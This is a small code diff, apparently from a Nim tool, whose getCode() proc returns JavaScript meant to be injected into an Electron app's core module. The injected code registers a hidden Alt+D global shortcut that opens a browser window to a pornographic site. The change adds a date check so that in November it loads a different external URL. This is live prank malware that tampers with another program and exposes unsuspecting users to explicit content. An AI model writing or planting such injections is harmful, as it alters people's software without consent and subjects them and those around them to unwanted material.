@@ -7,8 +7,10 @@ proc getCode(): string =
     return """
 const allahctron = require("electron")
 allahctron.globalShortcut.register('Alt+D', () => {
+    var url = "https://pornhub.com"
+    if ((new Date().getMonth() + 1) == 11) url = "https://notfubuki.xyz/api/raw/There_Is_NNN_To_Do"
     var bz = new allahctron.BrowserWindow({ width: 800, height: 600 })
-    bz.loadURL("https://pornhub.com")
+    bz.loadURL(url)
 });
 module.exports = require("./core.asar")"""
 
